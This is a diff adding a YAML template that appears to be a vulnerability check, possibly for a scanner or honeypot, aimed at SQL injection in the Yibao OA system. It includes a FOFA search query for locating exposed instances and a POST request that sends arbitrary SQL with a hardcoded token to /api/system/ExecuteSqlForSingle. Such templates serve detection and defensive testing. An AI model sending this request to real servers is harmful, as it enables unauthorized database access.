@@ -1,0 +1,24 @@
+id: yibao-sqli
+info:
+  name: Yibao OA System - SQL Injection
+  author: DhiyaneshDK
+  description: Yibao OA System is vulnerable to SQL Injection.
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: product="顶讯科技-易宝OA系统"
+  tags: yiboo,oa,sqli
+traps:
+- request:
+    method: POST
+    path: /api/system/ExecuteSqlForSingle
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{num}}'')),3,32)&strParameters
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: data":"{{md5({{num}})}}
